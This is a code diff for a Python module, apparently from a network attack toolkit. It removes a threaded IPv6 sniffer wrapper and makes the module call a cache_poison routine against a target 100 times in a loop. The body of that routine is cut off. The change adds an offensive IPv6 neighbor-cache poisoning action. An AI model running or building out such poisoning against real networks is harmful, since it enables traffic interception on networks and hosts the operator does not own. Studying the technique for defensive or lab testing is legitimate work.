@@ -24,47 +24,12 @@ class IPv6Module(Template):
 
     def action(self, target=None):
         self.sniffer = IPv6Sniffer(self)
-        self.socket_log('Sniffer intitialized.')
-        self.sniffer.start(target)
-
-    def stop_sniffer(self, msg):
-        try:
-            self.sniffer.stop()
-            self.socket_log('Sniffer terminated.')
-        except Exception, e:
-            self.socket_log('Sniffer not yet intitialized.')
-
-class IPv6Sniffer:
-    pool = None
-    stopped = False
-
-    def __init__(self, mod):
-        self.mod = mod
-
-    # initialize the listener
-    def start(self,target):
-        print("sniffer intialized")
-        self.stopped = False
-        self.pool = ThreadPool(processes=1)
-        self.pool.apply_async(self.send,[target])
-        # self.listen()
-
-    # start the listener
-    def send(self,target):
+        self.socket_log('Poisoning cache on %s.' % target)
         counter = 0
         while counter < 100:
             self.cache_poison(target)
             counter += 1
-
-    # stop the listener
-    def stop(self):
-        print('Stopping sniffer')
-        self.stopped = True
-        self.pool.close()
-        self.pool.join()
-
-    def stopfilter(self, packet):
-        return self.stopped
+        self.socket_log('Poisoning cache finished.')
 
     def cache_poison(self, target, dst=get_source_address(IPv6(dst="ff02::1"))):
         M = 16**4
